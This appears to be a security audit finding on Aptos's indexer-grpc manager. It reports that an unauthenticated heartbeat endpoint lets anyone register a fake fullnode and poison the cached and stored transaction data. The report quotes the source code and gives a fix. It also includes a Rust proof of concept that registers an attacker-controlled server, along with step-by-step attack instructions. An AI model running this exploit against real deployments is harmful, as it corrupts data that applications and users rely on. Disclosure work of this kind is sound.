# Audit Report

## Title
Unauthenticated Heartbeat Endpoint Allows Malicious Fullnode Registration Leading to Indexer Data Corruption

## Summary
The GrpcManagerService exposes an unauthenticated `heartbeat()` RPC endpoint that allows any network client to register arbitrary addresses as trusted fullnodes. This service isolation failure enables attackers to inject malicious transaction data into the indexer's cache and persistent file store, corrupting the data served to all indexer clients.

## Finding Description

The vulnerability exists in the integration between `GrpcManagerService` (created at line 92 of `grpc_manager.rs`) and the internal `MetadataManager` state. 

**Root Cause:**

The `heartbeat()` endpoint in `GrpcManagerService` accepts `HeartbeatRequest` messages without any authentication or authorization. [1](#0-0) 

When a heartbeat with `FullnodeInfo` is received, it's passed directly to `MetadataManager.handle_fullnode_info()`, which uses `.or_insert()` to register ANY claimed address as a trusted fullnode, even if it wasn't in the configured `fullnode_addresses` list. [2](#0-1) 

**Attack Propagation Path:**

1. **Service Layer Breach:** Attacker sends malicious `HeartbeatRequest` with fabricated `FullnodeInfo` claiming any address with any `known_latest_version`
2. **State Manager Corruption:** `MetadataManager` registers the malicious address in the `fullnodes` DashMap without validation
3. **Data Manager Compromise:** The `DataManager.start()` loop periodically calls `get_fullnode_for_request()`, which can randomly select the attacker's fake fullnode [3](#0-2) 
4. **Core Data Layer Poisoning:** When the malicious fullnode is selected, fake transaction data is directly inserted into the cache with zero validation [4](#0-3) 
5. **Persistent Corruption:** The `FileStoreUploader` reads from the poisoned cache and uploads fake data to the file store [5](#0-4) 

The complete lack of isolation is confirmed by security research showing the indexer heartbeat system has "basic structural validation rather than cryptographic authentication" unlike other Aptos services that use Noise protocol authentication.

## Impact Explanation

This represents a **High** severity issue per the classification in the security question. While it does not affect the core Aptos blockchain consensus or on-chain state (AptosDB remains secure), it compromises the indexer infrastructure's data integrity:

- **Data Corruption:** All clients consuming indexer data receive fabricated transaction history
- **Persistent Poisoning:** Fake data persists in file store across service restarts
- **Ecosystem Impact:** Applications, block explorers, and analytics platforms relying on the indexer serve incorrect data to end users
- **Service Availability:** Qualifies as "significant protocol violations" under High severity criteria

The indexer-grpc system is critical infrastructure for the Aptos ecosystem, making its compromise high impact despite being outside core consensus.

## Likelihood Explanation

**Likelihood: HIGH**

- **Attack Complexity:** Trivial - attacker only needs to craft a valid protobuf `HeartbeatRequest` and send it via gRPC
- **Prerequisites:** None - no authentication, no special network position required
- **Discovery:** The unauthenticated endpoint is publicly exposed on the configured `listen_address` [6](#0-5) 
- **Stealth:** Attack can be executed gradually to avoid detection, mixing real and fake fullnodes

## Recommendation

**Immediate Fix:** Implement authentication and validation for heartbeat requests:

1. **Reject unrecognized addresses:** Only accept heartbeats from pre-configured fullnode addresses
2. **Add cryptographic authentication:** Implement challenge-response authentication similar to the telemetry service's Noise protocol
3. **Validate transaction data:** Add integrity checks on received transactions (version continuity, hash chain validation)

**Code Fix for `metadata_manager.rs`:**

```rust
fn handle_fullnode_info(&self, address: GrpcAddress, info: FullnodeInfo) -> Result<()> {
    // SECURITY FIX: Only accept heartbeats from configured fullnodes
    if !self.fullnodes.contains_key(&address) {
        bail!("Heartbeat from unrecognized fullnode address: {}", address);
    }
    
    let mut entry = self.fullnodes.get_mut(&address)
        .ok_or_else(|| anyhow::anyhow!("Fullnode not found"))?;
    
    entry.value_mut().recent_states.push_back(info);
    // ... rest of the function
}
```

## Proof of Concept

```rust
// PoC: Malicious client registering fake fullnode
use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient,
    HeartbeatRequest, ServiceInfo, FullnodeInfo,
    service_info::Info,
};
use tonic::Request;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to GrpcManager (no authentication required)
    let mut client = GrpcManagerClient::connect("http://victim-grpc-manager:50051").await?;
    
    // Craft malicious heartbeat claiming to be a fullnode
    let malicious_fullnode_info = FullnodeInfo {
        chain_id: 1, // mainnet
        timestamp: Some(current_timestamp()),
        known_latest_version: Some(999999999), // Fake high version
    };
    
    let request = HeartbeatRequest {
        service_info: Some(ServiceInfo {
            address: Some("http://attacker-controlled-server:8080".to_string()),
            info: Some(Info::FullnodeInfo(malicious_fullnode_info)),
        }),
    };
    
    // Send unauthenticated heartbeat - will be accepted and registered
    let response = client.heartbeat(Request::new(request)).await?;
    println!("Malicious fullnode registered! Response: {:?}", response);
    
    // Now attacker's server will be queried by DataManager
    // and can return fabricated transaction data
    Ok(())
}
```

**Attack Steps:**
1. Run malicious gRPC server on attacker-controlled endpoint that returns crafted fake transactions
2. Send heartbeat to register the malicious server as a fullnode
3. Wait for `DataManager.start()` loop to randomly select the malicious fullnode
4. Serve fabricated transaction data when queried
5. Watch as fake data propagates to cache, file store, and all indexer clients

## Notes

**Important Context:** This vulnerability affects the **indexer-grpc infrastructure**, not the core Aptos blockchain consensus or on-chain state. The actual blockchain state in AptosDB, consensus protocol, and validator operations remain secure and unaffected. However, the indexer is critical ecosystem infrastructure that most applications use to consume blockchain data, making its compromise a significant security concern for the Aptos ecosystem.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L341-374)
```rust
    pub(crate) fn get_fullnode_for_request(
        &self,
        request: &GetTransactionsFromNodeRequest,
    ) -> (GrpcAddress, FullnodeDataClient<Channel>) {
        // TODO(grao): Double check the counters to see if we need a different way or additional
        // information.
        let mut rng = thread_rng();
        if let Some(fullnode) = self
            .fullnodes
            .iter()
            .filter(|fullnode| {
                fullnode
                    .recent_states
                    .back()
                    .is_some_and(|s| s.known_latest_version >= request.starting_version)
            })
            .choose(&mut rng)
            .map(|kv| (kv.key().clone(), kv.value().client.clone()))
        {
            COUNTER
                .with_label_values(&["get_fullnode_for_request__happy"])
                .inc();
            return fullnode;
        }

        COUNTER
            .with_label_values(&["get_fullnode_for_request__fallback"])
            .inc();
        self.fullnodes
            .iter()
            .choose(&mut rng)
            .map(|kv| (kv.key().clone(), kv.value().client.clone()))
            .unwrap()
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L533-550)
```rust
    fn handle_fullnode_info(&self, address: GrpcAddress, info: FullnodeInfo) -> Result<()> {
        let mut entry = self
            .fullnodes
            .entry(address.clone())
            .or_insert(Fullnode::new(address.clone()));
        entry.value_mut().recent_states.push_back(info);
        if let Some(known_latest_version) = info.known_latest_version {
            trace!(
                "Received known_latest_version ({known_latest_version}) from fullnode {address}."
            );
            self.update_known_latest_version(known_latest_version);
        }
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/data_manager.rs (L257-280)
```rust
                match response_item {
                    Ok(r) => {
                        if let Some(response) = r.response {
                            match response {
                                Response::Data(data) => {
                                    trace!(
                                        "Putting data into cache, {} transaction(s).",
                                        data.transactions.len()
                                    );
                                    self.cache.write().await.put_transactions(data.transactions);
                                },
                                Response::Status(_) => continue,
                            }
                        } else {
                            warn!("Error when getting transactions from fullnode: no data.");
                            continue 'out;
                        }
                    },
                    Err(e) => {
                        warn!("Error when getting transactions from fullnode: {}", e);
                        continue 'out;
                    },
                }
            }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/file_store_uploader.rs (L147-177)
```rust
            s.spawn(async move {
                loop {
                    let _timer = TIMER
                        .with_label_values(&["file_store_uploader_main_loop"])
                        .start_timer();
                    let next_version = file_store_operator.version();
                    let transactions = {
                        let _timer = TIMER
                            .with_label_values(&["get_transactions_from_cache"])
                            .start_timer();
                        data_manager
                            .get_transactions_from_cache(
                                next_version,
                                MAX_SIZE_PER_FILE,
                                /*update_file_store_version=*/ true,
                            )
                            .await
                    };
                    let len = transactions.len();
                    for transaction in transactions {
                        file_store_operator
                            .buffer_and_maybe_dump_transactions_to_file(transaction, tx.clone())
                            .await
                            .unwrap();
                    }
                    if len == 0 {
                        info!("No transaction was returned from cache, requested version: {next_version}.");
                        tokio::time::sleep(Duration::from_millis(200)).await;
                    }
                }
            });
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/grpc_manager.rs (L122-125)
```rust
            s.spawn(async move {
                info!("Starting GrpcManager at {}.", service_config.listen_address);
                server.serve(service_config.listen_address).await.unwrap();
            });
```
